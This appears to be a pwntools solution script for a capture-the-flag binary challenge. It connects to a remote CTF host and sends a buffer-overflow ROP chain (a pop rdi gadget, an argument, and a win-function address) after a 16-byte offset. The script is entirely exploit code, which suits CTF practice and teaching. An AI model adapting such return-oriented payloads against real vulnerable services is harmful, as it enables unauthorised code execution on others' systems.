from pwn import *

elf = ELF("./out")
context.binary = elf
context.log_level = "debug"

# io = elf.process()
io = remote("tjc.tf", 31457)

offset = 16
pop_rdi = 0x000000000040117a
win_addr = 0x000000000040117f

payload = flat({
	offset: [
		pop_rdi,
		0xdeadbeef,
		win_addr
		# elf.symbols.win
	]
	})

io.sendline(payload)
io.interactive()